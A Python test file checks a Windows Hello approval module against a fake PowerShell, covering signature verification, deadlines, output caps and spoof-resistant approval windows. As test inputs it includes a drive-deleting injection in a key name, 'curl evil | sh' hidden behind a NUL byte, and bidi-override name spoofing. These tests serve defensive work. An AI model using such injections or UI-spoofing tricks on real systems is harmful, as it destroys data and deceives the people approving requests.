"""Windows Hello as the proof of a human approval — tested with fakes only.

No test here raises a real Hello prompt: that is the user's, at the final live
check. What is tested is everything around the gesture — that a signature
Hello made verifies and a tampered one does not, that nothing a caller supplies
becomes PowerShell code, that every call is bounded however the far side
behaves, and that the approval window signs only after Approve.

The signature vector is REAL: the user made the gesture on 2026-11-14, signing
«collab r22b probe challenge 1» with a TPM-backed Hello key, and this is the
public key that key reported (.claude/r22b-strong-approval-design.md).
"""

from __future__ import annotations

import base64
import json
import os
import sys
import time

import pytest

from collab import consent_hello as hello

REAL_SPKI = base64.b64decode(
    "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAy9/WYAaAhr3PfMyHhtx+QiQmaQg68A0HasO5"
    "KdmSEibW967d4kUU5RalSlMG8A7X0qsQrmyLE+5gxnat/Mzr2fq3m+VsZ307CkXeXtlBMgXlbqzhtR7h"
    "dEDuaicEdnNutRooakFHjoiIpi3eRIgK4qYrjLMeuq5mpMSPoJf988j06E++oss+P2FgjcBJDK0OEH5g"
    "nZp5QJAsrgL2EJ948fANDWHVyG1GWGIR7rl2rG7N9JTxV+z1OQwpnBiD2fwPaPxIaSahXmfepSrM6Aj/"
    "XpLJrWdFkRYPygBCag2MwS21gD0SgL7p+Vbvz8ikqfHjSeEPX1RI2wxWqfgsM4B8wQIDAQAB")
REAL_MESSAGE = b"collab r22b probe challenge 1"
REAL_SIGNATURE = base64.b64decode(
    "J1Eeemt/VRFmUsL/rvbw1+qpvxBL9GAIr6Dj4qE++baQckwzmdUP6x4s3i7oOG2T04RWxjjdGLruMfZg"
    "6oUaWdndlYntczQVJ8vXnU3PNoN1FghPqW5ZvnovEPxnpBkejH4n8W1E6Dtsa8MfN7/1A0JCUSHXKrAX"
    "Wj3hNlJ3On8MVaVHjcm3Mr3pfuHaV3CtdBCRG5EgpYD4z5OtMJaB9yuCoiLEeuSB+2qsjFl4OyBrtsFd"
    "PGa5saHPn2RNL1uU2tmZ3NpzS1SogKMrIeEqY+uNlLXZmqHwfXUOuLpYEigRRXausSxeX/Fubogwou2x"
    "r0QAjX8PgqbYL1NgmrQHtg==")


# --- a fake powershell.exe ---------------------------------------------------------

FAKE = r'''#!{python}
import base64, json, os, sys, time, subprocess
plan = json.loads(open(os.environ["FAKE_HELLO_PLAN"]).read())
log = os.environ["FAKE_HELLO_LOG"]
line = sys.stdin.readline()
req = json.loads(base64.b64decode(line))
with open(log, "a") as fh:
    fh.write(json.dumps({{"argv": sys.argv[1:], "req": req}}) + "\n")
how = plan.get(req["op"], {{"status": "Success"}})
if how == "silent":
    child = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)"])
    open(os.environ["FAKE_HELLO_LOG"] + ".child", "w").write(str(child.pid))
    time.sleep(60)
elif how == "flood":
    while True:
        sys.stdout.write("x" * 65536)
        sys.stdout.flush()
elif how == "garbage":
    print("this is not json")
elif isinstance(how, dict) and how.get("bom"):
    sys.stdout.buffer.write(b"\xef\xbb\xbfWindows PowerShell banner\r\n"
                            + json.dumps(how["answer"]).encode() + b"\r\n")
else:
    print(json.dumps(how))
'''


@pytest.fixture
def fake(tmp_path, monkeypatch):
    """Install the fake and return a function that sets its plan."""
    exe = tmp_path / "powershell.exe"
    exe.write_text(FAKE.format(python=sys.executable))
    exe.chmod(0o755)
    plan = tmp_path / "plan.json"
    plan.write_text("{}")
    log = tmp_path / "calls.jsonl"
    monkeypatch.setattr(hello, "_powershell", lambda: str(exe))
    monkeypatch.setenv("FAKE_HELLO_PLAN", str(plan))
    monkeypatch.setenv("FAKE_HELLO_LOG", str(log))

    class Fake:
        def plan(self, **ops):
            plan.write_text(json.dumps(ops))

        def calls(self):
            if not log.exists():
                return []
            return [json.loads(x) for x in log.read_text().splitlines()]

        child_file = tmp_path / "calls.jsonl.child"

    return Fake()


# --- the signature is the proof -------------------------------------------------------

def test_a_signature_hello_made_verifies_and_nothing_else_does():
    """The real vector: the user's gesture, the key Hello reported. A changed
    message, a changed signature and a key that is not RSA are all refused."""
    assert hello.verify(REAL_SPKI, REAL_MESSAGE, REAL_SIGNATURE)
    assert not hello.verify(REAL_SPKI, b"collab r22b probe challenge 2", REAL_SIGNATURE)
    tampered = bytearray(REAL_SIGNATURE)
    tampered[10] ^= 1
    assert not hello.verify(REAL_SPKI, REAL_MESSAGE, bytes(tampered))
    assert not hello.verify(b"not a key", REAL_MESSAGE, REAL_SIGNATURE)
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric import ec

    ec_spki = ec.generate_private_key(ec.SECP256R1()).public_key().public_bytes(
        serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo)
    assert not hello.verify(ec_spki, REAL_MESSAGE, REAL_SIGNATURE)


# --- the four operations, against the fake ----------------------------------------------

def test_availability_is_asked_without_a_prompt_and_never_raises(fake, monkeypatch):
    fake.plan(supported={"status": "Success", "supported": True})
    assert hello.available() is True
    fake.plan(supported={"status": "Success", "supported": False})
    assert hello.available() is False
    fake.plan(supported="garbage")
    assert hello.available() is False
    monkeypatch.setattr(hello, "_powershell", lambda: None)
    assert hello.available() is False, "no powershell.exe: not available, not an error"


def test_enrolment_returns_what_the_hub_registers(fake):
    spki = base64.b64encode(REAL_SPKI).decode()
    fake.plan(create={"status": "Success", "spki": spki})
    record = hello.enrol("collab-alice")
    # Exactly the hub's `/enrol/finish` names, which rejects unknown fields;
    # the key as unpadded base64url.
    assert record == {"credential_id": "collab-alice", "method": "hello",
                      "algorithm": -257, "public_key_spki": hello.b64url(REAL_SPKI)}
    assert "=" not in record["public_key_spki"]
    assert hello.unb64url(record["public_key_spki"], limit=4096) == REAL_SPKI
    assert fake.calls()[-1]["req"] == {"op": "create", "name": "collab-alice"}


@pytest.mark.parametrize("status, error", [
    ("UserCanceled", hello.Refused), ("UserPrefersPassword", hello.Refused),
    ("CredentialAlreadyExists", hello.AlreadyEnrolled),
    ("SecurityDeviceLocked", hello.Unavailable), ("UnknownError", hello.HelloError),
])
def test_every_status_hello_can_give_has_its_meaning(fake, status, error):
    """A cancel is a refusal, an existing key is never replaced, a locked TPM
    is unavailability — and anything else is an error naming the status."""
    fake.plan(create={"status": status}, sign={"status": status})
    with pytest.raises(error) as raised:
        hello.enrol("collab-alice")
    assert raised.value.status == status
    with pytest.raises(error):
        hello.sign("collab-alice", b"challenge")


def test_signing_sends_exactly_the_challenge_and_returns_the_signature(fake):
    fake.plan(sign={"status": "Success",
                    "signature": base64.b64encode(REAL_SIGNATURE).decode()})
    assert hello.sign("collab-alice", REAL_MESSAGE) == REAL_SIGNATURE
    sent = fake.calls()[-1]["req"]
    assert base64.b64decode(sent["challenge"]) == REAL_MESSAGE
    fake.plan(sign={"status": "NotFound"})
    with pytest.raises(hello.NotEnrolled):
        hello.sign("collab-alice", REAL_MESSAGE)


def test_nothing_the_caller_supplies_reaches_powershell_as_code(fake):
    """The script is fixed and passed encoded; the name and the challenge go
    on stdin as base64 — never in the command line. A name that is not a
    plain key name is refused before any process starts."""
    with pytest.raises(ValueError):
        hello.sign("x'; Remove-Item C:\\ -Recurse; '", b"c")
    with pytest.raises(ValueError):
        hello.enrol("a\nb")
    with pytest.raises(ValueError):
        hello.sign("ok", b"")
    assert fake.calls() == [], "refused before any process"
    fake.plan(sign={"status": "Success", "signature": base64.b64encode(b"s").decode()})
    hello.sign("collab-alice", b"SECRET-CHALLENGE")
    argv = " ".join(fake.calls()[-1]["argv"])
    assert "collab-alice" not in argv and "SECRET" not in argv
    assert "-EncodedCommand" in argv and "-NonInteractive" in argv


def test_a_banner_a_bom_and_crlf_do_not_hide_the_answer(fake):
    fake.plan(supported={"bom": True, "answer": {"status": "Success", "supported": True}})
    assert hello.available() is True


def test_an_answer_that_is_not_one_is_refused(fake):
    fake.plan(pubkey="garbage")
    with pytest.raises(hello.HelloError) as raised:
        hello.public_key("collab-alice")
    assert raised.value.status == "BadAnswer"
    fake.plan(pubkey={"status": "Success", "spki": "not base64!!"})
    with pytest.raises(hello.HelloError):
        hello.public_key("collab-alice")


# --- bounded, whatever the far side does ----------------------------------------------

def test_a_silent_call_ends_at_its_deadline_with_its_whole_group(fake, monkeypatch):
    """A prompt nobody answers, or a PowerShell that hangs: the deadline is
    enforced while nothing arrives, and the call's own process group — what it
    started included — is ended, not just the handle collab holds."""
    monkeypatch.setattr(hello, "QUICK", 1.5)
    fake.plan(pubkey="silent")
    began = time.monotonic()
    with pytest.raises(hello.HelloError) as raised:
        hello.public_key("collab-alice")
    took = time.monotonic() - began
    assert raised.value.status == "Timeout"
    assert took < 4, f"{took:.1f} s"
    child = int(fake.child_file.read_text())
    deadline = time.monotonic() + 3
    while time.monotonic() < deadline:
        try:
            os.kill(child, 0)
        except ProcessLookupError:
            break
        time.sleep(0.05)
    with pytest.raises(ProcessLookupError):
        os.kill(child, 0)


def test_a_flood_is_cut_at_the_output_cap_cheaply(fake):
    """A far side printing without end: cut at `OUTPUT_CAP`, ended, and
    measured — the caller's CPU for the whole exchange and its memory."""
    resource = pytest.importorskip("resource")
    fake.plan(pubkey="flood")
    before = resource.getrusage(resource.RUSAGE_SELF)
    began = time.monotonic()
    with pytest.raises(hello.HelloError) as raised:
        hello.public_key("collab-alice")
    after = resource.getrusage(resource.RUSAGE_SELF)
    assert raised.value.status == "OutputTooLarge"
    assert time.monotonic() - began < 5
    cpu = (after.ru_utime + after.ru_stime) - (before.ru_utime + before.ru_stime)
    assert cpu < 0.5, f"{cpu:.3f} s of CPU"


# --- the approval window ----------------------------------------------------------------

def _request(**extra):
    base = {"request_id": "q_1", "requester_id": "p_bob", "requester_name": "bob",
            "subject": "remote prompt", "destination": "alice's agent",
            "authority": "run one prompt", "digest": "ab" * 32,
            "review_text": "please run: make test", "credential_id": "collab-alice",
            "challenge": hello.b64url(REAL_MESSAGE)}
    base.update(extra)
    return base


def test_approve_signs_the_challenge_and_only_approve_does(fake):
    """The click is the front door; the gesture is the lock. Approve leads to
    one signature over exactly the challenge; Decline and «use a passkey» to
    none."""
    sig = base64.b64encode(REAL_SIGNATURE).decode()
    fake.plan(window={"status": "Success", "choice": "approve"},
              sign={"status": "Success", "signature": sig},
              pubkey={"status": "Success", "spki": base64.b64encode(REAL_SPKI).decode()})
    result = hello.open_window(_request())
    assert result == {"choice": "approve", "method": "hello",
                      "credential_id": "collab-alice",
                      "proof": {"type": "hello", "signature": hello.b64url(REAL_SIGNATURE)}}
    signed = [c["req"] for c in fake.calls() if c["req"]["op"] == "sign"]
    assert len(signed) == 1 and base64.b64decode(signed[0]["challenge"]) == REAL_MESSAGE
    for choice, expected in (("decline", "decline"), ("passkey", "passkey"),
                             ("anything", "decline")):
        fake.plan(window={"status": "Success", "choice": choice})
        before = len([c for c in fake.calls() if c["req"]["op"] == "sign"])
        assert hello.open_window(_request())["choice"] == expected
        assert len([c for c in fake.calls() if c["req"]["op"] == "sign"]) == before


def test_a_cancelled_gesture_after_approve_is_a_decline(fake):
    fake.plan(window={"status": "Success", "choice": "approve"},
              sign={"status": "UserCanceled"})
    assert hello.open_window(_request()) == {"choice": "decline", "reason": "Refused"}


def test_a_window_that_breaks_or_hangs_approves_nothing_and_decides_nothing(
        fake, monkeypatch):
    """Nobody chose: the request EXPIRES. The window could not be shown: it is
    unavailable. Neither is «declined», which would be a decision nobody made
    — and neither is ever an approval."""
    monkeypatch.setattr(hello, "WINDOW_DEADLINE", 1.5)
    fake.plan(window="silent")
    assert hello.open_window(_request()) == {"choice": "expired"}
    fake.plan(window="garbage")
    assert hello.open_window(_request())["choice"] == "unavailable"
    fake.plan(window={"status": "Error", "error": "Win32Exception"})
    assert hello.open_window(_request())["choice"] == "unavailable"
    monkeypatch.setattr(hello, "_powershell", lambda: None)
    assert hello.open_window(_request()) == {"choice": "unavailable", "reason": "NoPowerShell"}


def test_no_key_enrolled_is_unavailable_so_the_dispatcher_can_offer_a_passkey(fake):
    fake.plan(window={"status": "Success", "choice": "approve"}, sign={"status": "NotFound"})
    assert hello.open_window(_request()) == {"choice": "unavailable", "reason": "NotEnrolled"}


def test_the_window_shows_the_review_as_untrusted_text_with_a_bounded_summary(fake):
    """The requester chose every one of these strings. The summary lines carry
    no control characters or newlines (a second «summary» line drawn by the
    requester would be the redraw this window must not invite), the review is
    marked untrusted and bounded, and it travels on stdin, not the command
    line."""
    fake.plan(window={"status": "Success", "choice": "decline"})
    hello.open_window(_request(requester_name="bob\nAPPROVED BY ADMIN\x1b[2J",
                        review_text="x" * (hello.REVIEW_MAX + 500)))
    call = fake.calls()[-1]
    sent = call["req"]
    for line in (sent["requester"], sent["name"], sent["summary"]):
        assert "\n" not in line and "\x1b" not in line
    assert sent["review"].startswith("UNTRUSTED")
    assert len(sent["review"]) < hello.REVIEW_MAX + 200
    # THE COMMAND LINE IS THE FIXED SCRIPT AND NOTHING ELSE: decoded, it is
    # exactly `_SCRIPT`, so no request text can have reached it.
    argv = call["argv"]
    encoded = argv[argv.index("-EncodedCommand") + 1]
    assert base64.b64decode(encoded).decode("utf-16-le") == hello._SCRIPT
    assert "digest abababababababab" in sent["summary"]


def test_controls_and_invisible_characters_are_shown_not_obeyed(fake):
    """WinForms stops drawing a TextBox at a NUL: «make test\\0; curl evil | sh»
    showed only «make test». Every control and format character — NUL, the
    bidi overrides and isolates, zero-width characters, the BOM — is shown as
    a visible \\u{XXXX}, in the review and in the lines above it."""
    fake.plan(window={"status": "Success", "choice": "decline"})
    hello.open_window(_request(
        review_text="make test\x00; curl evil | sh",
        requester_name="bob\u202e)ecila(\u2066x\u2069\u200b\ufeff"))
    sent = fake.calls()[-1]["req"]
    assert "\\u{0000}; curl evil | sh" in sent["review"]
    assert "\x00" not in sent["review"]
    for char in ("\u202e", "\u2066", "\u2069", "\u200b", "\ufeff"):
        assert char not in sent["name"]
    assert "\\u{202E}" in sent["name"] and "\\u{2066}" in sent["name"]


def test_the_hub_assigned_id_is_its_own_first_line_and_the_name_is_marked(fake):
    """A name chosen to read «alice (p_alice) asks for approval ⸻…» pushed the
    real id off a wrapped label. The id is the first line on its own; the
    name follows, marked as the requester's own choice."""
    fake.plan(window={"status": "Success", "choice": "decline"})
    hello.open_window(_request(requester_id="p_bob",
                               requester_name="alice (p_alice) asks for approval " + "⸻" * 80))
    sent = fake.calls()[-1]["req"]
    assert sent["requester"].startswith("Requester: p_bob")
    assert "assigned by the hub" in sent["requester"]
    assert sent["name"].startswith("Calls itself: alice") and sent["name"].endswith("(self-chosen)")
    assert "p_alice" not in sent["requester"]


def test_a_request_that_could_not_be_signed_never_reaches_a_human(fake):
    """The key name and the challenge are checked BEFORE the window: a human
    must not read and approve something that cannot then be signed."""
    for bad in ({"credential_id": "x'; Remove-Item"}, {"challenge": "not base64!"},
                {"challenge": ""}, {"credential_id": None}, {"challenge": None},
                # The hub's own encoding only: the same bytes in standard,
                # padded base64 are refused, not decoded to the same value.
                {"challenge": base64.b64encode(REAL_MESSAGE).decode()}):
        assert hello.open_window(_request(**bad)) == {"choice": "unavailable",
                                                      "reason": "BadRequest"}
    assert fake.calls() == []


def test_a_child_that_never_reads_cannot_stretch_the_deadline(tmp_path, monkeypatch):
    """The deadline used to start after a blocking stdin write; a child that
    never read its stdin held the caller for 30 s against a 2 s deadline. The
    clock starts before the process, and the write is on a thread."""
    exe = tmp_path / "powershell.exe"
    exe.write_text(f"#!{sys.executable}\nimport time\ntime.sleep(60)\n")
    exe.chmod(0o755)
    monkeypatch.setattr(hello, "_powershell", lambda: str(exe))
    monkeypatch.setattr(hello, "WINDOW_DEADLINE", 1.5)
    began = time.monotonic()
    result = hello.open_window(_request(review_text="r" * (hello.REVIEW_MAX - 100)))
    took = time.monotonic() - began
    assert result == {"choice": "expired"}
    assert took < 5, f"{took:.1f} s"


POWERSHELL = hello._powershell()


@pytest.mark.skipif(POWERSHELL is None, reason="needs Windows PowerShell")
def test_the_real_script_parses_and_its_window_builds_without_showing():
    """Against the real powershell.exe, with nothing on the screen: the fixed
    script parses with no errors, and the approval window is BUILT from a
    request — controls, labels, a hostile review — and disposed of unshown."""
    import subprocess

    check = (
        "$src = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("
        "[Console]::In.ReadLine()))\n"
        "$t = $null; $e = $null\n"
        "[void][System.Management.Automation.Language.Parser]::ParseInput($src, [ref]$t, [ref]$e)\n"
        "\"errors=$($e.Count)\"\n")
    out = subprocess.run(
        [POWERSHELL, "-NoProfile", "-NonInteractive", "-EncodedCommand",
         base64.b64encode(check.encode("utf-16-le")).decode()],
        input=base64.b64encode(hello._SCRIPT.encode()) + b"\n",
        capture_output=True, timeout=60)
    assert b"errors=0" in out.stdout, out.stdout
    built = hello.build_window_only(_request(review_text="make test\x00; curl evil | sh"))
    assert built["choice"] == "built"
    # ENTER AND ESC BOTH DECLINE. Enter-to-approve is the dangerous regression
    # — one keypress in the wrong window approves — and only the real form can
    # say which button each key is bound to.
    assert built["accept"] is True, "Enter must be bound to Decline"
    assert built["cancel"] is True, "Esc must be bound to Decline"


def test_a_signature_that_does_not_verify_locally_is_never_an_approval(fake):
    """The hub verifies every signature; the window checks too, against the
    key's own public half (read without a prompt), so an answer this machine's
    Hello did not make is never forwarded as an approval."""
    forged = base64.b64encode(b"\x00" * 256).decode()
    fake.plan(window={"status": "Success", "choice": "approve"},
              sign={"status": "Success", "signature": forged},
              pubkey={"status": "Success", "spki": base64.b64encode(REAL_SPKI).decode()})
    assert hello.open_window(_request()) == {"choice": "unavailable",
                                             "reason": "SignatureMismatch"}


def test_without_killpg_the_fallback_still_ends_the_call(fake, monkeypatch):
    """Where `os.killpg` does not exist (native Windows, or a platform that
    lacks it), `_end_group` falls back to `proc.kill()`: the call still ends at
    its deadline and the request still EXPIRES rather than hanging or
    raising."""
    import subprocess

    monkeypatch.setattr(hello, "WINDOW_DEADLINE", 1.5)
    monkeypatch.delattr(hello.os, "killpg")
    started = []
    real_popen = subprocess.Popen

    def popen(*args, **kwargs):
        proc = real_popen(*args, **kwargs)
        started.append(proc)
        return proc

    monkeypatch.setattr(hello.subprocess, "Popen", popen)
    fake.plan(window="silent")
    began = time.monotonic()
    try:
        assert hello.open_window(_request()) == {"choice": "expired"}
        assert time.monotonic() - began < 6
        assert started and started[0].poll() is not None, "the call's process ended"
    finally:
        # The fake's own child is not in reach of proc.kill(); end it by the
        # pid it recorded, which this test started.
        if fake.child_file.exists():
            try:
                os.kill(int(fake.child_file.read_text()), 9)
            except (ProcessLookupError, ValueError):
                pass


# --- the hub's encoding: canonical unpadded base64url, both ways -------------------

#: Seven bytes chosen so the encoding has BOTH url-safe characters and a length
#: (10) that standard base64 would pad to 12: `+-_/` is where the alphabets
#: differ, and padding is where a lenient decoder accepts two spellings.
VECTOR = bytes([0xFB, 0xEF, 0xFF, 0xFE, 0xFF, 0xBF, 0x3E])
VECTOR_URL = "--___v-_Pg"


def test_the_vector_uses_both_url_safe_characters_and_would_need_padding():
    assert hello.b64url(VECTOR) == VECTOR_URL
    assert "-" in VECTOR_URL and "_" in VECTOR_URL and len(VECTOR_URL) % 4
    assert base64.b64encode(VECTOR).decode() == "++///v+/Pg=="
    assert hello.unb64url(VECTOR_URL, limit=64) == VECTOR


@pytest.mark.parametrize("bad", [
    "--___v-_Pg==",          # padded
    "++///v+/Pg",            # the standard alphabet
    "++///v+/Pg==",          # standard and padded
    "--___v-_Ph",            # non-zero pad bits: a second spelling of VECTOR
    "--__ _v-_Pg",           # whitespace
    "--___v-_P",             # a length no encoding produces
    "",                      # nothing
    None, 7, b"--___v-_Pg",  # not text
])
def test_anything_but_canonical_unpadded_base64url_is_refused(bad):
    """The hub reads every binary field canonically (#161). This boundary used
    `b64decode`, which takes `+`, `/` and `=`; a challenge or key spelled that
    way here would not be the bytes the hub meant, or not bytes it accepts."""
    with pytest.raises(ValueError):
        hello.unb64url(bad, limit=64)


def test_a_field_longer_than_its_limit_is_refused_before_decoding(monkeypatch):
    """BEFORE: a dispatcher's oversized field must cost a length check, not a
    decode of however many megabytes it sent."""
    assert hello.unb64url(hello.b64url(bytes(64)), limit=64) == bytes(64)
    decoded = []
    real = base64.urlsafe_b64decode
    monkeypatch.setattr(hello.base64, "urlsafe_b64decode",
                        lambda v: decoded.append(len(v)) or real(v))
    with pytest.raises(ValueError):
        hello.unb64url(hello.b64url(bytes(65)), limit=64)
    with pytest.raises(ValueError):
        hello.unb64url("A" * 10_000_000, limit=4096)
    assert decoded == []


def test_the_window_takes_a_url_safe_challenge_and_answers_unpadded(fake, monkeypatch):
    """End to end through `open_window`: a challenge with `-` and `_` and a
    length standard base64 would pad reaches Hello as exactly its bytes, and
    the approval's signature goes back in the hub's encoding."""
    signature = bytes([0xFB, 0xFF]) + REAL_SIGNATURE[2:]
    fake.plan(window={"status": "Success", "choice": "approve"},
              sign={"status": "Success", "signature": base64.b64encode(signature).decode()},
              pubkey={"status": "Success", "spki": base64.b64encode(REAL_SPKI).decode()})
    verified = []
    monkeypatch.setattr(hello, "verify",
                        lambda spki, message, sig: verified.append(message) or True)
    result = hello.open_window(_request(challenge=VECTOR_URL))
    signed = [c["req"] for c in fake.calls() if c["req"]["op"] == "sign"]
    assert base64.b64decode(signed[0]["challenge"]) == VECTOR == verified[0]
    sent = result["proof"]["signature"]
    assert "=" not in sent and "+" not in sent and "/" not in sent
    assert hello.unb64url(sent, limit=4096) == signature
